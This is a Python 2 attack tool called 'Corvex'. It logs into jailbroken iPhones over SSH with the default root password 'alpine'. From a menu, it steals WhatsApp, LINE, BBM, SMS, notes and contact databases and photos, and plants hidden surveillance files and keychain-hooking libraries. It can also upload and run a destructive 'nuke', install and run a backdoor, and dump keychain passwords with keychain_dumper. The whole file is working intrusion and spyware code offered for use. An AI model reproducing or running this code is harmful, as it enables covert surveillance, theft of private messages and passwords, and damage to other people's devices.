import os
try:
	import paramiko
except Exception:
		print 'Corvex failed to load.'		
		print 'Corvex is dependent on Paramiko and Pycrypto module.'		
		print 'Module dependencies are not configured properly.'
print 'Corvex infiltration module 2.1.0 developed by Rex and Corvus.'
print 'Initiating Corvex...'
corvexdir = os.path.dirname(os.path.abspath(__file__)) + '/'
print 'Corvex is running at', corvexdir
loop = 1 
while loop == 1:
	try:	
		print "Input [abandon] to terminate Corvex."		
		rhost = raw_input('Enter target IP address: ')
		if rhost == '[abandon]':
			print 'Corvex terminated.'
			print 'Insidiantes Cavendi.'			
			quit()
		port = 22
		username = 'root'
		password = 'alpine'
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(rhost, username = username, password = password)
		stdin, stdout, stderr = \
		ssh.exec_command("uptime")
		type(stdin)
		print stdout.readlines()
		loop = 0
		print 'Connection successful.'	
	except Exception:
		print 'Error: Could not connect to specified IP address'
		print
raw_input('Press enter to initiate session')
transport = paramiko.Transport((rhost, port))
transport.connect(username = username, password = password)
sftp = paramiko.SFTPClient.from_transport(transport)
print 'Session has been successfully established.'
def menu(list, question):
	for entry in list:
		print 1 + list.index(entry),
		print ") " + entry
	return input(question) - 1
options = ["Directory probing","Application ID grabbing and gather text intelligence","Gather photographic intelligence","Gather BBM photographic intelligence","Test download","Plant surveillance","Test upload","Deploy nuke","Deploy backdoor","Execute backdoor","Grab SSH keys","Execute PassLoot","Respring target iDevice","Reboot target iDevice","Shutdown target iDevice","Quit Corvex"]
loop = 1 
print "Welcome to Corvex."
print len(options), "options available at the moment."
print "Choose any options below:"
while loop == 1:
	choice = menu(options, "Input your selection:")
	if choice == 0:
		print		
		raw_input('Press enter to initiate directory probing')
		rdir = raw_input('Enter remote directory to probe:')
		print 'Directory list for:', rdir
		print
		try:		
			sftp.chdir(rdir)
			for i in sftp.listdir():
				lstatout=str(sftp.lstat(i)).split()[0]
			      	if 'd' in lstatout: 
						print i, 'is a directory'
						subdir = sftp.listdir(i)
						print subdir
						print
			print 'Directory listing complete.'
			print
		except Exception:
			print "Error: Could not scan the specified directory"
	elif choice == 1:
		print
		raw_input('Press enter to initiate Application ID grabbing.')
		print 'Scanning Applications directory...'
		appdir = '/var/mobile/Applications/'
		whatsappnull = 'yes'
		sftp.chdir(appdir)
		for i in sftp.listdir():
			 lstatout=str(sftp.lstat(i)).split()[0]
			 if 'd' in lstatout:
				   appid = i
				   subdirwhatsapp = sftp.listdir(i)
				   if 'WhatsApp.app' in subdirwhatsapp:
								       print
								       print '[Application ID acquired]'
								       whatsappnull = 'no'
								       whatsappid = appid 
								       print 'Whatsapp Application ID:', whatsappid
								       print
		linenull = 'yes'
		sftp.chdir(appdir)
		for i in sftp.listdir():
			 lstatout=str(sftp.lstat(i)).split()[0]
			 if 'd' in lstatout:
				   appid = i		       
				   subdirline = sftp.listdir(i)
				   if 'LINE.app' in subdirline:
							       print
							       print '[Application ID acquired]'
							       linenull = 'no'
							       lineid = appid
							       print 'Line Application ID:', lineid
		bbmnull = 'yes'
		sftp.chdir(appdir)
		for i in sftp.listdir():
			 lstatout=str(sftp.lstat(i)).split()[0]
			 if 'd' in lstatout:
				   appid = i		       
				   subdirbbm = sftp.listdir(i)
				   if 'BBM.app' in subdirbbm:
							       print
							       print '[Application ID acquired]'
							       bbmnull = 'no'
							       bbmid = appid
							       print 'BBM Application ID:', bbmid
		print
		print 'Application ID grabbing complete.'
		tint = raw_input('Gather text intelligence? (y/n):')
		if tint == 'y':
			       print 'Accessing Application ID database...'
			       if whatsappnull == 'no': 
						   print '[Whatsapp found]'
						   whatsappdata = '/Documents/ChatStorage.sqlite'
						   sftp.get(appdir + whatsappid + whatsappdata, corvexdir + 'ChatStorage.sqlite')
						   print 'Download 100%'
						   print 'File saved in', corvexdir + 'ChatStorage.sqlite'
						   print
			       if whatsappnull == 'yes':
						    print '[Whatsapp not found]'
			       if linenull == 'no': 
						   print '[Line found]'
						   linedata = '/Documents/talk.sqlite'
						   sftp.get(appdir + lineid + linedata, corvexdir + 'talk.sqlite')
						   print 'Download 100%'
						   print 'File saved in', corvexdir + 'talk.sqlite'
					           print
			       if linenull == 'yes':
						    print '[Line not found]'
			       if bbmnull == 'no': 
						   print '[BBM found]'
						   bbmdata = '/Library/bbmcore/master.db'
						   sftp.get(appdir + bbmid + bbmdata, corvexdir + 'master.db')
						   print 'Download 100%'
						   print 'File saved in', corvexdir + 'master.db'
						   print
			       if bbmnull == 'yes':
						    print '[BBM not found]'
		ltint = raw_input('Gather library text intelligence? (y/n):')
		if ltint == 'y':
			sftp.get('/var/mobile/Library/Notes/notes.sqlite', corvexdir + 'notes.sqlite')
			print 'Notes intelligence 100% downloaded.'
			print 'File saved in', corvexdir + 'notes.sqlite'			
			sftp.get('/var/mobile/Library/AddressBook/AddressBook.sqlitedb', corvexdir + 'AddressBook.sqlitedb')
			print 'Contacts intelligence 100% downloaded.'
			print 'File saved in', corvexdir + 'AddressBook.sqlitedb'
			try:
				sftp.get('/var/mobile/Library/SMS/sms.db', corvexdir + 'sms.db')
				print 'SMS intelligence 100% downloaded.'
			except	Exception:
				print 'Error: could not find sms database, remote device might be using non-iPhone device.'
				pass
 		print 'Download complete, all files saved to:', corvexdir
		print
	elif choice == 2:
		print		
		pint = raw_input('Gather device photographic intelligence? (y/n):')
		if pint == 'y':
			   remotepintdir = '/var/mobile/Media/DCIM/100APPLE/'
			   print 'Downloading photos...'
			   filelist = sftp.listdir(remotepintdir)
			   for item in filelist:
				       sftp.get(remotepintdir + item, corvexdir + item)
			   print 'Download success, files saved to:', corvexdir
			   print
	elif choice == 3:
		bbmpint = raw_input('Gather BBM photographic intelligence? (y/n):')
		if bbmpint == 'y':
			   appdir = '/var/mobile/Applications/'
			   sftp.chdir(appdir)
		           for i in sftp.listdir():
			   	lstatout=str(sftp.lstat(i)).split()[0]
			        if 'd' in lstatout:
					appid = i		       
				        subdirbbm = sftp.listdir(i)
				        if 'BBM.app' in subdirbbm:
		 		        	print
						print '[Application ID acquired]'
						bbmnull = 'no'
					        bbmid = appid
					        print 'BBM Application ID:', bbmid
			   			bbmphoto = '/Library/bbmcore/files/' 
			   			print 'Downloading photos...'
			  			filelist = sftp.listdir(appdir + bbmid + bbmphoto)
			   			for item in filelist:
				       			sftp.get(appdir + bbmid + bbmphoto + item, corvexdir + item)
			   			print 'Download success, all files saved to:', corvexdir
			   			print
	elif choice == 4:
		print	
		download = raw_input('Do you want to test download? (y/n):')
		if download == 'y':
			 localdndir = raw_input('Enter local download directory (Example/filename.txt):')
			 remotedndir = raw_input('Enter remote download directory (example/Example/filename.txt):')
			 sftp.get(remotedndir, localdndir)
			 print 'Download successful.'
			 print
	elif choice == 5:
		print		
		autoupload = raw_input('Plant surveillance? (y/n):')
		if autoupload == 'y':
		   raw_input('Press enter to proceed.')
		   print 'Planting surveillance measure...'
		   sftp.mkdir('/Library/Caches')
		   sftp.mkdir('/Library/Caches/.keycache')
		   html1 = '/Library/Caches/.keycache/advancesettings.html'
		   html2 = '/Library/Caches/.keycache/index.html'
		   html3 = '/Library/Caches/.keycache/login.html'
		   html4 = '/Library/Caches/.keycache/login-trial.html'
		   html5 = '/Library/Caches/.keycache/reset-password.html'
		   html6 = '/Library/Caches/.keycache/screenshots.html'
		   html7 = '/Library/Caches/.keycache/settings.html'
		   html8 = '/Library/Caches/.keycache/webhistory.html'
		   sftp.put(html1, html1)
		   print html1, '100%'
		   sftp.put(html2, html2)
		   print html2, '100%'
		   sftp.put(html3, html3)
		   print html3, '100%'
		   sftp.put(html4, html4)
		   print html4, '100%'
		   sftp.put(html5, html5)
		   print html5, '100%'
		   sftp.put(html6, html6)
		   print html6, '100%'
		   sftp.put(html7, html7)
		   print html7, '100%'
		   sftp.put(html8, html8)
		   print html8, '100%'
		   sftp.mkdir('/Library/Caches/.keycache/css')
		   css1 = '/Library/Caches/.keycache/css/jquery.qtip.min.css'
		   css2 = '/Library/Caches/.keycache/css/lightbox.css'
		   sftp.put(css1, css1)
		   print css1, '100%'
		   sftp.put(css2, css2)
		   print css2, '100%'
		   sftp.mkdir('/Library/Caches/.keycache/images')
		   image1 = '/Library/Caches/.keycache/images/ad.png'
		   image2 = '/Library/Caches/.keycache/images/bullet.gif'
		   image3 = '/Library/Caches/.keycache/images/close.gif'
		   image4 = '/Library/Caches/.keycache/images/closelabel.gif'
		   image5 = '/Library/Caches/.keycache/images/code.png'
		   image6 = '/Library/Caches/.keycache/images/download-icon.gif'
		   image7 = '/Library/Caches/.keycache/images/footer.png'
		   image8 = '/Library/Caches/.keycache/images/help.png'
		   image9 = '/Library/Caches/.keycache/images/loading.gif'
		   image10 = '/Library/Caches/.keycache/images/login.png'
		   image11 = '/Library/Caches/.keycache/images/logout.png'
		   image12 = '/Library/Caches/.keycache/images/main-h1.png'
		   image13 = '/Library/Caches/.keycache/images/main-hb.png'
		   image14 = '/Library/Caches/.keycache/images/nextlabel.gif'
		   image15 = '/Library/Caches/.keycache/images/prevlabel.gif'
		   image16 = '/Library/Caches/.keycache/images/question.png'
		   image17 = '/Library/Caches/.keycache/images/register.png'
		   image18 = '/Library/Caches/.keycache/images/save.png'
		   image19 = '/Library/Caches/.keycache/images/table-b-left.png'
		   image20 = '/Library/Caches/.keycache/images/table-b-middle.png'
		   image21 = '/Library/Caches/.keycache/images/table-b-right.png'
		   image22 = '/Library/Caches/.keycache/images/table-t-left.png'
		   image23 = '/Library/Caches/.keycache/images/table-t-middle.png'
		   image24 = '/Library/Caches/.keycache/images/table-t-right.png'
		   sftp.put(image1, image1)
		   print image1, '100%'
		   sftp.put(image2, image2)
		   print image2, '100%'
		   sftp.put(image3, image3)
		   print image3, '100%'
		   sftp.put(image4, image4)
		   print image4, '100%'
		   sftp.put(image5, image5)
		   print image5, '100%'
		   sftp.put(image6, image6)
		   print image6, '100%'
		   sftp.put(image7, image7)
		   print image7, '100%'
		   sftp.put(image8, image8)
		   print image8, '100%'
		   sftp.put(image9, image9)
		   print image9, '100%'
		   sftp.put(image10, image10)
		   print image10, '100%'
		   sftp.put(image11, image11)
		   print image11, '100%'
		   sftp.put(image12, image12)
		   print image12, '100%'
		   sftp.put(image13, image13)
		   print image13, '100%'
		   sftp.put(image14, image14)
		   print image14, '100%'
		   sftp.put(image15, image15)
		   print image15, '100%'
		   sftp.put(image16, image16)
		   print image16, '100%'
		   sftp.put(image17, image17)
		   print image17, '100%'
		   sftp.put(image18, image18)
		   print image18, '100%'
		   sftp.put(image19, image19)
		   print image19, '100%'
		   sftp.put(image20, image20)
		   print image20, '100%'
		   sftp.put(image21, image21)
		   print image21, '100%'
		   sftp.put(image22, image22)
		   print image22, '100%'
		   sftp.put(image23, image23)
		   print image23, '100%'
		   sftp.put(image24, image24)
		   print image24, '100%'
		   sftp.mkdir('/Library/Caches/.keycache/js')
		   js1 = '/Library/Caches/.keycache/js/builder.js'
		   js2 = '/Library/Caches/.keycache/js/effects.js'
		   js3 = '/Library/Caches/.keycache/js/jquery.qtip.min.js'
		   js4 = '/Library/Caches/.keycache/js/jquery-1.7.2.min.js'
		   js5 = '/Library/Caches/.keycache/js/lightbox.js'
		   js6 = '/Library/Caches/.keycache/js/lightbox-web.js'
		   js7 = '/Library/Caches/.keycache/js/prototype.js'
		   js8 = '/Library/Caches/.keycache/js/scriptaculous.js'
		   sftp.put(js1, js1)
		   print js1, '100%'
		   sftp.put(js2, js2)
		   print js2, '100%'
		   sftp.put(js3, js3)
		   print js3, '100%'
		   sftp.put(js4, js4)
		   print js4, '100%'
		   sftp.put(js5, js5)
		   print js5, '100%'
		   sftp.put(js6, js6)
		   print js6, '100%'
		   sftp.put(js7, js7)
		   print js7, '100%'
		   sftp.put(js8, js8)
		   print js8, '100%'
		   dylib1 = '/Library/MobileSubstrate/DynamicLibraries/keychain.dylib'
		   dylib2 = '/Library/MobileSubstrate/DynamicLibraries/keychain.plist'
		   dylib3 = '/Library/MobileSubstrate/DynamicLibraries/MobileSafe.dylib'
		   dylib4 = '/Library/MobileSubstrate/DynamicLibraries/MobileSafe.plist'
		   sftp.put(dylib1, dylib1)
		   print dylib1, '100%'
		   sftp.put(dylib2, dylib2)
		   print dylib2, '100%'
		   sftp.put(dylib3, dylib3)
		   print dylib3, '100%'
		   sftp.put(dylib4, dylib4)
		   print dylib4, '100%'
		   print 'Surveillance measure has been successfully planted.'
		   print
	elif choice == 6:
		print		
		upload = raw_input('Do you want to test upload? (y/n):')
		if upload == 'y':
		   localupdir = raw_input('Enter local upload directory (Example/filename.txt):')
		   remoteupdir = raw_input('Enter remote upload directory (example/Example/filename.txt):')
		   sftp.put(localupdir, remoteupdir)
		   print 'Upload successful.'
		   print
	elif choice == 7:
		print
		raw_input('Press enter to proceed and launch the nuke.')
		print 'Launching nuke warhead...'
		sftp.put(corvexdir + 'nuke', '/nuke')
		print 'Launch success.'
		raw_input('Safety measure: press enter to proceed and detonate the nuke.')
		print 'Detonating nuke file...'		
		stdin, stdout, stderr = \
		ssh.exec_command("cd /; chmod +x nuke; ./nuke")
		type(stdin)
		print stdout.read()
		print
		print 'Nuke has been exploded and critically damaged the remote device.'
		print 'Removing warhead from remote device...'
		stdin, stdout, stderr = \
		ssh.exec_command("cd /; rm nuke")
		print 'Nuke warhead has been successfully removed.'
		raw_input('Nuke completed. Press enter to proceed.')
		print
	elif choice == 8:
		print
		raw_input('Press enter to proceed and launch backdoor')
		print 'Uploading backdoor file...'
		sftp.put(corvexdir + 'backdoor.sh', '/usr/libexec/backdoor.sh')
		print 'Upload success.'
		raw_input('Press enter to proceed and configure backdoor')	
		stdin, stdout, stderr = \
		ssh.exec_command("cd /usr/libexec/backdoor.sh; chmod +x backdoor;")
		type(stdin)
		print stdout.read()
		print
		raw_input('Backdoor installed. Press enter to proceed.')
		print
	elif choice == 9:
		print
		raw_input('Press enter to proceed and execute backdoor.')
		print 'Executing backdoor...'
		stdin, stdout, stderr = \
		ssh.exec_command("cd /usr/libexec; ./backdoor;")
		print 'Backdoor initiated.'
		print
	elif choice == 10:
		print
		raw_input('Make sure you generate RSA keys via traditional SSH first. Press enter to proceed.')
		print		
		print 'Grabbing SSH keys...'
		sftp.get('/var/root/.ssh/id_rsa.pub', corvexdir + 'id_rsa.pub')
		print		
		print 'SSH keys successfully downloaded to', corvexdir, 'Please upload the files to the server and configure.'
		print
	elif choice == 11:
		print
		raw_input('Press enter to initiate PassLoot module.')
		print 'Uploading module...'
		sftp.put(corvexdir + 'keychain_dumper', '/keychain_dumper')
		print 'Upload success.'
		print 'Executing module...'
		stdin, stdout, stderr = \
		ssh.exec_command("cd /; chmod a+x keychain_dumper; ./keychain_dumper")
		type(stdin)
		file = open("passloot.txt", "w")
		file.write(stdout.read())
		file.close()
		print 'PassLoot module successfully executed.'
		print 'Looted passwords are stored in', corvexdir + 'passloot.txt'
		print 'Deleting module from remote device...'
		stdin, stdout, stderr = \
		ssh.exec_command("cd /; rm keychain_dumper")
		type(stdin)
		print 'Module has been successfully deleted from remote device.'
		raw_input('Press enter to continue.')
		print
	elif choice == 12:
		print
		respring = raw_input('Do you want to respring target iDevice? (y/n):')
		if respring == 'y':
			      stdin, stdout, stderr = \
			      ssh.exec_command("killall SpringBoard")
			      type(stdin)
			      stdout.readlines()
			      print 'Respring success.'
			      print
	elif choice == 13:
		print		
		reboot = raw_input('Do you want to reboot target iDevice? (y/n):')
		if reboot == 'y':
			     stdin, stdout, stderr = \
			     ssh.exec_command("reboot")
			     type(stdin)
			     stdout.readlines()
			     print 'Reboot success.'
			     print
	elif choice == 14:
		print		
		shutdown = raw_input('Do you want to shutdown target iDevice? (y/n):')
		if shutdown == 'y':
			      stdin, stdout, stderr = \
			      ssh.exec_command("halt")
			      type(stdin)
			      stdout.readlines()
			      print 'Shutdown success.'
			      print
	elif choice == 15:
		loop = 0
		raw_input('Session complete, press enter to terminate connection')
		sftp.close()
		transport.close()
		ssh.close()
		print 'Connection has been terminated.'
		print 'Insidiantes Cavendi.'
